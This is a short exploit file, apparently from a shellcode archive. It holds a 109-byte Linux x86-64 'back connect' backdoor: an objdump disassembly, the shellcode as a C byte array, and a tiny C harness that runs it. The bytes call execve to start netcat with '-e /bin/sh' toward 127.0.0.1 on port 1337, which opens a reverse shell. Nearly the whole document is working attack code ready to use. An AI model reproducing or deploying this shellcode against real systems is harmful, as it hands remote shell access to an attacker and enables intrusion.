
// Shellcode len: 109 back connect NETCAT
// article: http://chmodsecurity.com.br/artigo/23/writing-backdoor-in-asm-linux-64-bits-sycall-netcat.html
*/
root@ChmoSec:~/Desktop/linux# objdump -d backdoor

backdoor:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <continue-0x4e>:
  400080:	48 31 d2             	xor    %rdx,%rdx
  400083:	48 bf ff 2f 62 69 6e 	movabs $0x636e2f6e69622fff,%rdi
  40008a:	2f 6e 63 
  40008d:	48 c1 ef 08          	shr    $0x8,%rdi
  400091:	57                   	push   %rdi
  400092:	48 89 e7             	mov    %rsp,%rdi
  400095:	48 b9 ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rcx
  40009c:	2f 73 68 
  40009f:	48 c1 e9 08          	shr    $0x8,%rcx
  4000a3:	51                   	push   %rcx
  4000a4:	48 89 e1             	mov    %rsp,%rcx
  4000a7:	48 bb ff ff ff ff ff 	movabs $0x652dffffffffffff,%rbx
  4000ae:	ff 2d 65 
  4000b1:	48 c1 eb 30          	shr    $0x30,%rbx
  4000b5:	53                   	push   %rbx
  4000b6:	48 89 e3             	mov    %rsp,%rbx
  4000b9:	49 ba ff ff ff ff 31 	movabs $0x37333331ffffffff,%r10
  4000c0:	33 33 37 
  4000c3:	49 c1 ea 20          	shr    $0x20,%r10
  4000c7:	41 52                	push   %r10
  4000c9:	49 89 e2             	mov    %rsp,%r10
  4000cc:	eb 11                	jmp    4000df <ip>

00000000004000ce <continue>:
  4000ce:	41 59                	pop    %r9
  4000d0:	52                   	push   %rdx
  4000d1:	51                   	push   %rcx
  4000d2:	53                   	push   %rbx
  4000d3:	41 52                	push   %r10
  4000d5:	41 51                	push   %r9
  4000d7:	57                   	push   %rdi
  4000d8:	48 89 e6             	mov    %rsp,%rsi
  4000db:	b0 3b                	mov    $0x3b,%al
  4000dd:	0f 05                	syscall 

00000000004000df <ip>:
  4000df:	e8 ea ff ff ff       	callq  4000ce <continue>
  4000e4:	31 32                	xor    %esi,(%rdx)
  4000e6:	37                   	(bad)  
  4000e7:	2e 30 2e             	xor    %ch,%cs:(%rsi)
  4000ea:	30 2e                	xor    %ch,(%rsi)
  4000ec:	31                   	.byte 0x31
root@ChmoSec:~/Desktop/linux# 
/*
char shellcode[] = "\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11\x41\x59\x52\x51\x53\x41\x52\x41\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}

